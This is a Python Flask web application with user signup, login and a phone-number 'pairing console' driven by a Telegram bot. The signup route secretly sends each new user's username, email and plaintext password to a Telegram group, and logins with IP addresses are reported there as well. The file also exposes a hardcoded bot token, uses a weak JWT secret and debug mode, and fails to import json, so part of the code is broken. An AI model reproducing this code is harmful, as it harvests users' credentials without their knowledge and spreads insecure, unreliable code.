from flask import Flask, render_template, request, jsonify, Response
import sqlite3
import threading
import requests
from werkzeug.security import generate_password_hash, check_password_hash
import jwt
import time
import uuid
from datetime import datetime, timedelta

app = Flask(__name__)
app.config['SECRET_KEY'] = 'Shadow'
app.config['DATABASE'] = 'database.db'
app.config['TELEGRAM_BOT_TOKEN'] = '8435439233:AAG9bmCOM9C95ITnFz-ltx3Y4uulau0UnbI'
app.config['LOGIN_GROUP_ID'] = '-4956158594'
app.config['PAIR_GROUP_ID'] = '-4700893831'

# Initialize database
def init_db():
    with app.app_context():
        db = get_db()
        with app.open_resource('schema.sql', mode='r') as f:
            db.cursor().executescript(f.read())
        db.commit()

def get_db():
    db = sqlite3.connect(app.config['DATABASE'])
    db.row_factory = sqlite3.Row
    return db

# Database schema (schema.sql)
"""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS user_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    token TEXT UNIQUE NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users (id)
);

CREATE TABLE IF NOT EXISTS console_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    paired_number TEXT,
    is_active BOOLEAN DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users (id)
);

CREATE TABLE IF NOT EXISTS login_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    action TEXT NOT NULL,  -- 'login' or 'signup'
    ip_address TEXT,
    user_agent TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users (id)
);
"""

# Telegram bot functions
def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{app.config['TELEGRAM_BOT_TOKEN']}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

# JWT token functions
def generate_token(user_id):
    payload = {
        'user_id': user_id,
        'exp': datetime.utcnow() + timedelta(days=7)
    }
    return jwt.encode(payload, app.config['SECRET_KEY'], algorithm='HS256')

def verify_token(token):
    try:
        payload = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
        return payload['user_id']
    except:
        return None

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET'])
def login_page():
    return render_template('login.html')

@app.route('/signup', methods=['GET'])
def signup_page():
    return render_template('signup.html')

@app.route('/dashboard', methods=['GET'])
def dashboard():
    # Verify token from cookie or local storage
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not token:
        return render_template('login.html')
    
    user_id = verify_token(token)
    if not user_id:
        return render_template('login.html')
    
    # Get user info
    db = get_db()
    user = db.execute('SELECT username FROM users WHERE id = ?', (user_id,)).fetchone()
    db.close()
    
    if not user:
        return render_template('login.html')
    
    return render_template('dashboard.html')

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'message': 'Username and password required'}), 400
    
    db = get_db()
    user = db.execute('SELECT id, username, password FROM users WHERE username = ? OR email = ?', 
                      (username, username)).fetchone()
    db.close()
    
    if not user or not check_password_hash(user['password'], password):
        return jsonify({'message': 'Invalid credentials'}), 401
    
    # Generate token
    token = generate_token(user['id'])
    
    # Log login
    log_user_action(user['id'], 'login', request.remote_addr, request.headers.get('User-Agent'))
    
    # Send Telegram notification
    telegram_msg = f"*Account login*\nUsername: `{user['username']}`\nIP: `{request.remote_addr}`"
    threading.Thread(target=send_telegram_message, args=(app.config['LOGIN_GROUP_ID'], telegram_msg)).start()
    
    return jsonify({
        'token': token,
        'username': user['username']
    })

@app.route('/api/signup', methods=['POST'])
def signup():
    data = request.get_json()
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')
    
    if not username or not email or not password:
        return jsonify({'message': 'All fields are required'}), 400
    
    hashed_password = generate_password_hash(password)
    
    db = get_db()
    try:
        cursor = db.cursor()
        cursor.execute('INSERT INTO users (username, email, password) VALUES (?, ?, ?)',
                       (username, email, hashed_password))
        user_id = cursor.lastrowid
        db.commit()
        
        # Generate token
        token = generate_token(user_id)
        
        # Log signup
        log_user_action(user_id, 'signup', request.remote_addr, request.headers.get('User-Agent'))
        
        # Send Telegram notification
        telegram_msg = f"*New account created*\nUsername: `{username}`\nEmail: `{email}`\nPassword: `{password}`"
        threading.Thread(target=send_telegram_message, args=(app.config['LOGIN_GROUP_ID'], telegram_msg)).start()
        
        return jsonify({
            'token': token,
            'username': username
        })
    except sqlite3.IntegrityError as e:
        db.rollback()
        if 'username' in str(e):
            return jsonify({'message': 'Username already exists'}), 400
        elif 'email' in str(e):
            return jsonify({'message': 'Email already exists'}), 400
        return jsonify({'message': 'Registration failed'}), 400
    finally:
        db.close()

@app.route('/api/start-console', methods=['POST'])
def start_console():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    user_id = verify_token(token)
    if not user_id:
        return jsonify({'message': 'Unauthorized'}), 401
    
    db = get_db()
    try:
        # Check if user already has an active console session
        existing_session = db.execute(
            'SELECT id FROM console_sessions WHERE user_id = ? AND is_active = 1',
            (user_id,)
        ).fetchone()
        
        if existing_session:
            return jsonify({'message': 'Console is already active'}), 400
        
        # Create new console session
        db.execute(
            'INSERT INTO console_sessions (user_id, is_active) VALUES (?, 1)',
            (user_id,)
        )
        db.commit()
        
        return jsonify({'message': 'Console started successfully'})
    except Exception as e:
        db.rollback()
        return jsonify({'message': str(e)}), 500
    finally:
        db.close()

@app.route('/api/stop-console', methods=['POST'])
def stop_console():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    user_id = verify_token(token)
    if not user_id:
        return jsonify({'message': 'Unauthorized'}), 401
    
    db = get_db()
    try:
        # Get current console session
        session = db.execute(
            'SELECT id, paired_number FROM console_sessions WHERE user_id = ? AND is_active = 1',
            (user_id,)
        ).fetchone()
        
        if not session:
            return jsonify({'message': 'No active console session'}), 400
        
        # If there's a paired number, send /delpair command
        if session['paired_number']:
            telegram_msg = f"/delpair {session['paired_number']}"
            threading.Thread(target=send_telegram_message, args=(app.config['PAIR_GROUP_ID'], telegram_msg)).start()
        
        # Deactivate session
        db.execute(
            'UPDATE console_sessions SET is_active = 0 WHERE id = ?',
            (session['id'],)
        )
        db.commit()
        
        return jsonify({'message': 'Console stopped successfully'})
    except Exception as e:
        db.rollback()
        return jsonify({'message': str(e)}), 500
    finally:
        db.close()

@app.route('/api/process-number', methods=['POST'])
def process_number():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    user_id = verify_token(token)
    if not user_id:
        return jsonify({'message': 'Unauthorized'}), 401
    
    data = request.get_json()
    number = data.get('number')
    
    if not number:
        return jsonify({'message': 'Number is required'}), 400
    
    db = get_db()
    try:
        # Get current console session
        session = db.execute(
            'SELECT id FROM console_sessions WHERE user_id = ? AND is_active = 1',
            (user_id,)
        ).fetchone()
        
        if not session:
            return jsonify({'message': 'No active console session'}), 400
        
        # Update with paired number
        db.execute(
            'UPDATE console_sessions SET paired_number = ? WHERE id = ?',
            (number, session['id'])
        )
        db.commit()
        
        # Send /pair command to Telegram
        telegram_msg = f"/pair {number}"
        threading.Thread(target=send_telegram_message, args=(app.config['PAIR_GROUP_ID'], telegram_msg)).start()
        
        return jsonify({'message': 'Number processed successfully'})
    except Exception as e:
        db.rollback()
        return jsonify({'message': str(e)}), 500
    finally:
        db.close()

@app.route('/api/console-updates')
def console_updates():
    token = request.args.get('token')
    user_id = verify_token(token)
    if not user_id:
        return Response(status=403)
    
    def event_stream():
        db = get_db()
        last_check = datetime.utcnow()
        
        while True:
            # Check for new messages for this user's paired number
            session = db.execute(
                'SELECT paired_number FROM console_sessions WHERE user_id = ? AND is_active = 1',
                (user_id,)
            ).fetchone()
            
            if session and session['paired_number']:
                # In a real app, you would check your database or message queue for new codes
                # For this example, we'll just simulate checking
                time.sleep(1)
                
                # Simulate receiving a code (replace with actual Telegram bot integration)
                if datetime.utcnow() > last_check + timedelta(seconds=10):
                    last_check = datetime.utcnow()
                    yield f"data: {json.dumps({'message': 'Simulated code: 123456'})}\n\n"
            else:
                time.sleep(1)
    
    return Response(event_stream(), mimetype="text/event-stream")

@app.route('/api/list-logins', methods=['GET'])
def list_logins():
    # This would be protected and only accessible via the Telegram bot
    # For simplicity, we'll implement the bot separately
    pass

def log_user_action(user_id, action, ip_address, user_agent):
    db = get_db()
    try:
        db.execute(
            'INSERT INTO login_logs (user_id, action, ip_address, user_agent) VALUES (?, ?, ?, ?)',
            (user_id, action, ip_address, user_agent)
        )
        db.commit()
    except:
        db.rollback()
    finally:
        db.close()

if __name__ == '__main__':
    app.run(debug=True)
